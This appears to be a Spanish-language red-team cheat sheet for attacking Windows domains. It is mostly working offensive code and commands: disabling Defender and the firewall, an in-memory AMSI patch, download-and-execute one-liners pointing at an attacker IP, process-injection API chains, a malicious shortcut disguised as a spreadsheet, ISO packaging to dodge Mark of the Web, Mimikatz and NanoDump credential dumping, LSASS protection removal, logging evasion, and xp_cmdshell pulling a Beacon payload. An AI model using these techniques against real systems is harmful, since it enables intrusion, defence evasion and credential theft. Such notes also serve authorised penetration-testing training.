





## 1. Enumeración y Diagnóstico del Entorno

Herramientas para identificar defensas y configuraciones antes de lanzar ataques.

### Scripts de Enumeración (PowerShell)

PowerShell

```
# Cargar módulos básicos
. .\powermad.ps1
. .\powerview.ps1

# Escalar privilegios locales (PowerUp)
. .\PowerUp.ps1
Invoke-AllChecks

# Buscar acceso WinRM/PSRemoting con privilegios de Admin
. .\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess

# Chequear Bases de Datos SQL
Import-Module .\PowerupSQL-master\PowerupSQL.psd1

# Chequear EDRs presentes
Invoke-EDRChecker.ps1 -remote -computer <NombrePC>
```

### Diagnóstico de Binarios

PowerShell

```
# Verificar si Windows Defender detecta un archivo específico
DefenderCheck.exe <Archivo>

# Modificar metadatos de un binario (Ej. cambiar ProductName para parecer legítimo)
rcedit-x64.exe ms_file.dll --set-version-string "ProductName" "Vmware Workstation"
```

---

## 2. Manipulación de Windows Defender y Firewall

Comandos para degradar la seguridad si se tienen privilegios suficientes.

PowerShell

```
# Ver estado y amenazas detectadas
Get-MpComputerStatus
Get-MpThreat
Get-MpThreatDetection

# Deshabilitar protecciones (Requiere Admin/SYSTEM)
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableRealtimeMonitoring $true

# Deshabilitar perfiles de Firewall
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

---

## 3. AMSI Bypass (Antimalware Scan Interface)

AMSI inspecciona scripts (PowerShell, VBS, JS) y memoria antes de la ejecución. El bypass consiste en parchear la DLL en memoria (`amsi.dll`) para que siempre devuelva "limpio".

### Método C# (Reflection / P-Invoke)

Este script carga `amsi.dll` y parches la función `AmsiScanBuffer`.

C#

```
// Definición de la clase Meow para parchear memoria
$Meow = '
using System;
using System.Runtime.InteropServices;
public class Meow {
  [DllImport("kernel32")]
  public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
  [DllImport("kernel32")]
  public static extern IntPtr LoadLibrary(string name);
  [DllImport("kernel32")]
  public static extern void CopyMemory(IntPtr dest, IntPtr src, uint count);
  [DllImport("kernel32")]
  public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
  public static void cp(byte[] source, IntPtr dest, int count) {
    Marshal.Copy(source, 0, dest, count);
  }
}
';
Add-Type $Meow;

// Ejecución del parche (Patch bytes: 0xB8, 0x57...)
$LoadLibrary = [Meow]::LoadLibrary("a" + "m" + "si.dll");
$Address = [Meow]::GetProcAddress($LoadLibrary, "Am" + "si" + "Sc" + "an" + "Bu" + "ff" + "er");
$p = 0;
[Meow]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p);
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);
[Meow]::cp($Patch, $Address, 6);
```

### One-Liners y Ofuscación

Técnicas para romper firmas estáticas mediante concatenación de strings o reflexión.

PowerShell

```
# One-liner para descargar ejecutar bypass remoto
iex ((new-object net.webclient).downloadstring("http://IP_ATACANTE/meowme.ps1"))

# Matt Graeber's Reflection Bypass (Ofuscado)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

## 4. Inyección de Procesos (Process Injection)

Uso de la API de Windows (P/Invoke) para ejecutar código malicioso dentro de procesos legítimos.

|**Técnica**|**Flujo de API (C/C++)**|**Descripción**|
|---|---|---|
|**Classic Injection**|`OpenProcess` -> `VirtualAllocEx` -> `WriteProcessMemory` -> `CreateRemoteThread`|Inyección básica en otro proceso. Ruidosa.|
|**Reflective DLL**|`VirtualAlloc` -> `memcpy` -> `CreateThread`|Carga una DLL directamente desde la memoria sin tocar disco.|
|**Thread Hijacking**|`CreateThread(SUSPENDED)` -> `GetThreadContext` -> `SetThreadContext(RIP)` -> `ResumeThread`|Pausa un hilo existente y cambia su puntero de instrucción (RIP) al shellcode.|
|**APC Injection**|`CreateToolhelp32Snapshot` -> `QueueUserAPC`|Encola código asíncrono en un hilo. Se ejecuta cuando el hilo entra en estado "Alertable".|
|**Early Bird APC**|`CreateProcess(SUSPENDED)` -> `QueueUserAPC` -> `ResumeThread`|Inyecta en el proceso antes de que arranque el hilo principal. Muy efectiva contra EDRs.|
|**Process Hollowing**|`CreateProcess(SUSPENDED)` -> `NtQueryInformationProcess` -> `WriteProcessMemory`|Vacía el código legítimo de un proceso y escribe el malicioso en el Entry Point.|

---

## 5. Payloads y Ejecución (CRTO Tools)

Técnicas para empaquetar y entregar payloads evitando detecciones estáticas.

### GadgetToJScript & LNKs

Convertir .NET assemblies a JScript y ejecutarlos vía accesos directos.

PowerShell

```
# Convertir DLL a JS
GadgetToJScript.exe -a MyDropper.dll -w js -b -o deals

# Crear acceso directo (.lnk) malicioso
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("C:\Payloads\deals\deals.xlsx.lnk")
$lnk.TargetPath = "%COMSPEC%"
$lnk.Arguments = "/C start deals.xlsx && wscript deals.js"
$lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
$lnk.Save()
```

### Empaquetado ISO1

Ocultar archivos maliciosos dentro de un contenedor ISO para e2vitar el "Mark of the Web" (MotW).

Bash

```
# Crear ISO con archivos ocultos
python3 PackMyPayload.py -H deals.xlsx,deals.js /origen/ /destino/deals.iso
```

---

## 6. Robo de Credenciales (Dumping Avanzado)

### Mimikatz

PowerShell

```
privilege::debug
sekurlsa::logonpasswords    # Dump estándar
lsadump::sam                # Dump SAM (Local)
lsadump::secrets            # LSA Secrets
token::revert               # Volver al token original
vault::list                 # Listar Windows Vault
```

### NanoDump (Stealthy LSASS Dump)

Técnica avanzada para volcar LSASS evitando AV/EDR usando `Mockingjay` (DLL Hijacking) y `Donut`.

1. **Preparación:** Usar una DLL vulnerable (ej. `msvcp140.dll` en `mockingjay.exe`) y cambiar su `ProductName` para evadir firmas.
    
2. **Shellcode:** Convertir `nanodump.x64.exe` a shellcode con `donut`.
    
    Bash
    
    ```
    donut.exe -f 1 -p " -sc -f --write nano.dmp" -i nanodump.x64.exe -o nano.bin
    ```
    
3. **Ejecución:** Transferir y ejecutar en la víctima (usando técnica de DLL hijacking).
    
4. **Restauración:** Descargar el dump y restaurar la firma para leerlo con Mimikatz.
    
    PowerShell
    
    ```
    restore_signature.exe nano.dmp
    sekurlsa::minidump nano.dmp
    ```
    

### Mimikatz Driver (PPL Bypass)

Si LSASS está protegido (PPL), usar el driver de Mimikatz para desactivarlo.

PowerShell

```
mimikatz.exe "!+" "!processprotect /process:lsass.exe /remove"
```

---

## 7. Controles de Aplicación (WDAC / AppLocker / JEA)

### Windows Defender Application Control (WDAC)

PowerShell

```
# Leer política actual binaria
path: \\c$\Windows\System32\CodeIntegrity\DG.bin.p7

# Convertir a XML para análisis
ConvertTo-CIPolicy -BinaryFilePath DG.bin.p7 -XmlFilePath policy.xml
```

- **Bypass:** Usar LOLBins (Binarios del sistema firmados por MS) o inyección de código en procesos permitidos.
    

### Just Enough Administration (JEA)

Restricción de PowerShell a comandos específicos.

- **Crear Rol:** `New-Item ... RoleCapabilities`.
    
- **Configurar:** `Register-PSSessionConfiguration`.
    
- **Bypass:** Buscar funciones que permitan ejecutar código arbitrario o rutas no sanitizadas.
    

---

## 8. Tips & Trucos Varios

### Ofuscación de Argumentos (ArgSplit)

Evitar el logging de línea de comandos partiendo strings en variables de entorno.

DOS

```
set "z=t" & set "y=s" ...
set "Pwn=%q%%r%%s%..." 
Loader.exe -args %Pwn%
```

### SQL Pivoting con Evasión

Inyectar comandos PowerShell ofuscados a través de MSSQL `xp_cmdshell`.

SQL

```
-- Descargar y ejecutar AMSI bypass + Payload en memoria
EXEC master..xp_cmdshell 'powershell -c IEX(New-Object Net.WebClient).DownloadString("http://IP/amsi.ps1"); IEX(...Beacon.ps1)'
```

### InviShell

Script para ejecutar PowerShell evadiendo logs de transcripción y ScriptBlock logging.

DOS

```
.\InviShell\RunWithRegistryNonAdmin.bat
```

### PortProxy (Tunneling sin herramientas externas)

Bash

```
# Redirigir tráfico local (8080) a remoto (80)
netsh interface portproxy add v4tov4 listenport=8080 connectport=80 connectaddress=192.168.100.1
```